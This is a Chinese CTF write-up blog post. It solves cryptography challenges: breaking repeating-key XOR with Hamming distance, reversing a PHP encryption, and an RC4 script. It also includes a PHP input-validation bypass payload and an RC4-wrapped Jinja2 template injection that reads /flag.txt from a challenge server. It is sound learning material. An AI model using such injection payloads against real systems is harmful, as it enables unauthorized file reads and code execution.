---
title: 密码学题目
author: ch3n9w
date: 2019-04-22 04:14:20
typora-root-url: ../
categories: CTF
---

> 记录密码学刷过的题目

<!--more-->

## De1ctf2019 xorzz

源码
```python
from itertools import *
#  from data import flag,plain

plain = "dd"
flag = "de1ctf{testflag}"
key=flag.strip("de1ctf{").strip("}")
assert(len(key)<38)

salt="WeAreDe1taTeam"

ki=cycle(key)
si=cycle(salt)

cipher = ''.join([hex(ord(p) ^ ord(next(ki)) ^ ord(next(si))) for p in plain])
print cipher

# output:
# 49380d773440222d1b421b3060380c3f403c3844791b202651306721135b6229294a3c3222357e766b2f15561b35305e3c3b670e49382c295c6c170553577d3a2b791470406318315d753f03637f2b614a4f2e1c4f21027e227a4122757b446037786a7b0e37635024246d60136f7802543e4d36265c3e035a725c6322700d626b345d1d6464283a016f35714d434124281b607d315f66212d671428026a4f4f79657e34153f3467097e4e135f187a21767f02125b375563517a3742597b6c394e78742c4a725069606576777c314429264f6e330d7530453f22537f5e3034560d22146831456b1b72725f30676d0d5c71617d48753e26667e2f7a334c731c22630a242c7140457a42324629064441036c7e646208630e745531436b7c51743a36674c4f352a5575407b767a5c747176016c0676386e403a2b42356a727a04662b4446375f36265f3f124b724c6e346544706277641025063420016629225b43432428036f29341a2338627c47650b264c477c653a67043e6766152a485c7f33617264780656537e5468143f305f4537722352303c3d4379043d69797e6f3922527b24536e310d653d4c33696c635474637d0326516f745e610d773340306621105a7361654e3e392970687c2e335f3015677d4b3a724a4659767c2f5b7c16055a126820306c14315d6b59224a27311f747f336f4d5974321a22507b22705a226c6d446a37375761423a2b5c29247163046d7e47032244377508300751727126326f117f7a38670c2b23203d4f27046a5c5e1532601126292f577776606f0c6d0126474b2a73737a41316362146e581d7c1228717664091c

```

首先将密文中的盐分去掉。
```python
from itertools import *
from base64 import *

output='49380d773440222d1b421b3060380c3f403c3844791b202651306721135b6229294a3c3222357e766b2f15561b35305e3c3b670e49382c295c6c170553577d3a2b791470406318315d753f03637f2b614a4f2e1c4f21027e227a4122757b446037786a7b0e37635024246d60136f7802543e4d36265c3e035a725c6322700d626b345d1d6464283a016f35714d434124281b607d315f66212d671428026a4f4f79657e34153f3467097e4e135f187a21767f02125b375563517a3742597b6c394e78742c4a725069606576777c314429264f6e330d7530453f22537f5e3034560d22146831456b1b72725f30676d0d5c71617d48753e26667e2f7a334c731c22630a242c7140457a42324629064441036c7e646208630e745531436b7c51743a36674c4f352a5575407b767a5c747176016c0676386e403a2b42356a727a04662b4446375f36265f3f124b724c6e346544706277641025063420016629225b43432428036f29341a2338627c47650b264c477c653a67043e6766152a485c7f33617264780656537e5468143f305f4537722352303c3d4379043d69797e6f3922527b24536e310d653d4c33696c635474637d0326516f745e610d773340306621105a7361654e3e392970687c2e335f3015677d4b3a724a4659767c2f5b7c16055a126820306c14315d6b59224a27311f747f336f4d5974321a22507b22705a226c6d446a37375761423a2b5c29247163046d7e47032244377508300751727126326f117f7a38670c2b23203d4f27046a5c5e1532601126292f577776606f0c6d0126474b2a73737a41316362146e581d7c1228717664091c'

salt="WeAreDe1taTeam"

sa = cycle(salt)
out = output.decode('hex')

res = ""

for i in out:
    res += chr(ord(i) ^ ord(next(sa)))

#  print b64encode(res.encode('hex'))
print b64encode(res)
```
去掉盐分之后，问题就变成了汉明文密码。原理见博客https://www.anquanke.com/post/id/161171#h2-0
这里直接上脚本了。

```python
# -*- coding: utf-8 -*-

import itertools
import linecache

CHARACTER_FREQ = {
    'a': 0.0651738, 'b': 0.0124248, 'c': 0.0217339, 'd': 0.0349835, 'e': 0.1041442, 'f': 0.0197881, 'g': 0.0158610,
    'h': 0.0492888, 'i': 0.0558094, 'j': 0.0009033, 'k': 0.0050529, 'l': 0.0331490, 'm': 0.0202124, 'n': 0.0564513,
    'o': 0.0596302, 'p': 0.0137645, 'q': 0.0008606, 'r': 0.0497563, 's': 0.0515760, 't': 0.0729357, 'u': 0.0225134,
    'v': 0.0082903, 'w': 0.0171272, 'x': 0.0013692, 'y': 0.0145984, 'z': 0.0007836, ' ': 0.1918182
}

def xor_repeat_key(key,string):
	key_len=len(key)
	result=''
	str_result=''
	for index,ch in enumerate(string):
		n=index%key_len
		b=chr(ord(key[n])^ord(ch))
		str_result+=b
	return str_result

#获得概率分数
def get_score(string):
	score=0
	for char in string:
		char=char.lower()
		if char in CHARACTER_FREQ:
			score+=CHARACTER_FREQ[char]
	return score


#将hex的每个字符与备选密钥进行xor
def single_xor(candidate_key,hex_string):
	result=""
	for i in hex_string:
		b=chr(candidate_key^ord(i))
		result+=b
	return result

#遍历备选密钥
def Traversal_singlechar(hex_string):
	candidate=[]
	for candidate_key in range(256):
		plaintext=single_xor(candidate_key,hex_string)
		score=get_score(plaintext)
		result={
		'score':score,
		'plaintext':plaintext,
		'key':candidate_key
		}
		candidate.append(result)
	return sorted(candidate,key=lambda c:c['score'])[-1]


def hamming_distance(a_str,b_str):
	dist=0
	for x,y in zip(a_str,b_str):
		b=bin(ord(x)^ord(y)) #转换为二进制（以字符串形式表示，如“0b100000”，0b表示二进制）
		dist+=b.count('1')
	return dist

def guess_keysize(string):
	normals=[]
	for keysize in range(2,40):
		blocks=[]
		cnt=0
		distance=0
		#根据建议获得四个block，将这四个block两两得到hamming_distance。
		for i in range(0,len(string),keysize):
			cnt+=1
			blocks.append(string[i:i+keysize])
			if cnt==4:
				break
		pairs=itertools.combinations(blocks,2)
		for (x,y) in pairs:
			distance+=hamming_distance(x,y)
		#平均一下
		distance=distance/(6.0)
		#Normalize this result by dividing by KEYSIZE.
		normal_distance=distance/keysize
		key={
		'keysize':keysize,
		'distance':normal_distance
		}
		normals.append(key)
		#print key
	#选3个最小的为待选的keysize
	candidate_keysize=sorted(normals,key=lambda c:c['distance'])[0:3]
	return candidate_keysize

def guess_key(keysize,string):
	now_str=''
	key=''
	for i in range(keysize):
		now_str=''
		for index,ch in enumerate(string):
			if index%keysize==i:
				now_str+=ch
		#获得key的第i位的值,转换为字符
		#print now_str
		key+=chr(Traversal_singlechar(now_str)['key'])
	return key

def get_plaint(string):
	keysize_list=guess_keysize(string)
	candidate_key=[]
	possible_plaints=[]
	for keysize in keysize_list:
		key=guess_key(keysize['keysize'],string)
		#print key
		possible_plaints.append((xor_repeat_key(key,string),key))

	'''
	for i in possible_plaints:
		print i[1]
		print get_score(i[0].decode('hex'))
		print len(i[0])
		print i[0].decode('hex')
	'''
	
	return sorted(possible_plaints,key=lambda c:get_score(c[0]))[-1]


def main():
	assert hamming_distance('this is a test', 'wokka wokka!!!') == 37
	contents=open('6.txt').read()
	#base64解码
	string=str(contents).decode('base64')
	result=get_plaint(string)
	print result[0]
	print result[1]

if __name__ == '__main__':
	main()
```
6.txt中的内容是去盐分之后的密文base64之后的内容。

再附上hctf2018中天枢的脚本
```python
import string

def bxor(a, b):     # xor two byte strings of different lengths
    if len(a) > len(b):
        return bytes([x ^ y for x, y in zip(a[:len(b)], b)])
    else:
        return bytes([x ^ y for x, y in zip(a, b[:len(a)])])


def hamming_distance(b1, b2):
    differing_bits = 0
    for byte in bxor(b1, b2):
        differing_bits += bin(byte).count("1")
    return differing_bits


def break_single_key_xor(text):
    key = 0
    possible_space=0
    max_possible=0
    letters = string.ascii_letters.encode('ascii')
    for a in range(0, len(text)):
        maxpossible = 0
        for b in range(0, len(text)):
            if(a == b):
                continue
            c = text[a] ^ text[b]
            if c not in letters and c != 0:
                continue
            maxpossible += 1
        if maxpossible>max_possible:
            max_possible=maxpossible
            possible_space=a
    key = text[possible_space]^ 0x20
    return chr(key)


text = ''
with open("6.txt","r") as f:
    for line in f:
        text += line
#  b = base64.b64decode(text)
    b = text


normalized_distances = []


for KEYSIZE in range(2, 40):
    b1 = b[: KEYSIZE]
    b2 = b[KEYSIZE: KEYSIZE * 2]
    b3 = b[KEYSIZE * 2: KEYSIZE * 3]
    b4 = b[KEYSIZE * 3: KEYSIZE * 4]
    b5 = b[KEYSIZE * 4: KEYSIZE * 5]
    b6 = b[KEYSIZE * 5: KEYSIZE * 6]

    normalized_distance = float(
        hamming_distance(b1, b2) +
        hamming_distance(b2, b3) +
        hamming_distance(b3, b4) +
        hamming_distance(b4, b5) + 
        hamming_distance(b5, b6) 
    ) / (KEYSIZE * 5)
    normalized_distances.append(
        (KEYSIZE, normalized_distance)
    )
normalized_distances = sorted(normalized_distances,key=lambda x:x[1])


for KEYSIZE,_ in normalized_distances[:5]:
    block_bytes = [[] for _ in range(KEYSIZE)]
    for i, byte in enumerate(b):
        block_bytes[i % KEYSIZE].append(byte)
    keys = ''
    try:
        for bbytes in block_bytes:
            keys += break_single_key_xor(bbytes)
        key = bytearray(keys * len(b), "utf-8")
        plaintext = bxor(b, key)
        print("keysize:", KEYSIZE)
        print("key is:", keys, "n")
        s = bytes.decode(plaintext)
        print(s)
    except Exception:
        continue

```
## MD5
### PHP_encrypto_1

source code:::

```php

<?php
function encrypt($data,$key)
{
    $key = md5('ISCC');
    $x = 0;
    $len = strlen($data);
    $klen = strlen($key);
    for ($i=0; $i < $len; $i++) {
        if ($x == $klen)
        {
            $x = 0;
        }
        $char .= $key[$x];
        $x+=1;
    }
    for ($i=0; $i < $len; $i++) {
        $str .= chr((ord($data[$i]) + ord($char[$i])) % 128);
    }
    return base64_encode($str);
}
?>//the result is fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA=

```

solving:

```php
<?php
    #'ISCC'md5之后的结果
    $mkey ='729623334f0aa2784a1599fd374c120d';
    $target='fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA=';
    $target=base64_decode($target);

    $target_ay=array();

    for ($i=0;$i<strlen($target);$i++) {
        echo ord($target[$i]).' ';
        array_push($target_ay,ord($target[$i]));
    }
    echo "||||||||";
    $j=0;
    $realkey_ay=array();
    for ($i=0;$i<strlen($target);$i++){
        if ($j==strlen($mkey)){
            $j=0;
        }

        echo ord($mkey[$j]).' ';
        array_push($realkey_ay,ord($mkey[$j]));
        $j++;
    }
    $flag1='';
    $flag2='';
    foreach($target_ay as $key=>$value){
        $i=$key;
        $dd=$value;
        $od=$realkey_ay[$i];
        $flag1.=chr($dd+128-$od);
        $flag2.=chr($dd-$od);
    }
    echo $flag1;
    echo $flag2;
?>
```



## other

### shiyanbar do you really know php?(plalindrome)

```php

<?php


$info = "";
$req = [];
$flag="xxxxxxxxxx";

ini_set("display_error", false);
error_reporting(0);


if(!isset($_POST['number'])){
   header("hint:6c525af4059b4fe7d8c33a.txt");

   die("have a fun!!");
}

foreach([$_POST] as $global_var) {
    foreach($global_var as $key => $value) {
        $value = trim($value);
        is_string($value) && $req[$key] = addslashes($value);
    }
}

function is_palindrome_number($number) {
    $number = strval($number);
    $i = 0;
    $j = strlen($number) - 1;
    while($i < $j) {
        if($number[$i] !== $number[$j]) {
            return false;
        }
        $i++;
        $j--;
    }
    return true;
}

//can not input number
if(is_numeric($_REQUEST['number'])){

   $info="sorry, you cann't input a number!";

//the number must be int-type
}elseif($req['number']!=strval(intval($req['number']))){

     $info = "number must be equal to it's integer!! ";

}else{

     $value1 = intval($req["number"]);
     $value2 = intval(strrev($req["number"]));

//the number should be plalindrome
     if($value1!=$value2){
          $info="no, this is not a palindrome number!";
     }else{

//the number should not be plalindrome
          if(is_palindrome_number($req["number"])){
              $info = "nice! {$value1} is a palindrome number!";
          }else{
             $info=$flag;
          }
     }

}

echo $info;
?>
```
payload :2147483647%00

first: as there is %00, is_numeric() will not recognize it as number

second: both strval and intval will ignore %00 and %20

third: after strrev() 2147483647 will turn to 7463847412 , however, intval() can hanle max num of 2147483647,
so intval(7463847412)=2147483647

forth: the number is not plalindrome,so get the flag

## RC4

rc4: 加密和解密都是同一个流程

```python
import urllib
import requests

url = "http://43141291-ab15-4d3a-a236-3c2c0fd69898.node3.buuoj.cn/secret?secret="

class RC4:
    def __init__(self, key):
        self.key = key
        self.key_length = len(key)
        self._init_S_box()
 
    def _init_S_box(self):
        self.Box = [i for i in range(256)]
        k = [self.key[i % self.key_length] for i in range(256)]
        j = 0
        for i in range(256):
            j = (j + self.Box[i] + ord(k[i])) % 256
            self.Box[i], self.Box[j] = self.Box[j], self.Box[i]
 
    def crypt(self, plaintext):
        i = 0
        j = 0
        result = ''
        for ch in plaintext:
            i = (i + 1) % 256
            j = (j + self.Box[i]) % 256
            self.Box[i], self.Box[j] = self.Box[j], self.Box[i]
            t = (self.Box[i] + self.Box[j]) % 256
            result += chr(self.Box[t] ^ ord(ch))
        return result

a = RC4('HereIsTreasure')
cmd = "{{ [].__class__.__base__.__subclasses__()[40]('/flag.txt').read() }}"
payload = urllib.parse.quote(a.crypt(cmd))
res = requests.get(url + payload)
print(res.text)
```







